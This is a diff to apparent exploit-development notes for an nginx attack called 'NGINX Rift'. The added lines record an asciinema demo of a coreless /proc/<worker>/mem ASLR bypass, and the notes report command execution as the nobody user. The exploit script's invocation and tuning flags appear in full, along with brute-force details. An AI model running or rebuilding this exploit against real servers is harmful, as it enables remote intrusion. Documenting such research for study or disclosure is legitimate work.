@@ -78,6 +78,17 @@ timeout 300 python3 -u tools/proc_mem_coreless_exploit.py \
   - output: `uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)`.
 - This is coreless: it did not read or require `/app/tmp/core`.
 - Practical brute-force note: after `/proc/<worker>/mem` narrows the candidate list to 115 full-address slots, the final stage is a bounded candidate campaign. In the successful run, candidate 1 won; the implemented cap was 5.
+- Recorded a fresh live proof run with asciinema and converted it to GIF:
+  - cast: `artifacts/coreless_proc_mem_win_20260518.cast`,
+  - gif: `artifacts/coreless_proc_mem_win_20260518.gif`.
+- Recording command:
+
+```bash
+asciinema record --overwrite --return --idle-time-limit 1 --window-size 120x36 \
+  --title "NGINX Rift coreless proc-mem ASLR bypass" \
+  --command "python3 -u tools/proc_mem_coreless_exploit.py --target 127.0.0.1:19321 --cmd id --target-len 6 --max-region 268435456 --max-final-candidates 5" \
+  artifacts/coreless_proc_mem_win_20260518.cast
+```
 
 ### Known-Offset Brute Force Check
 
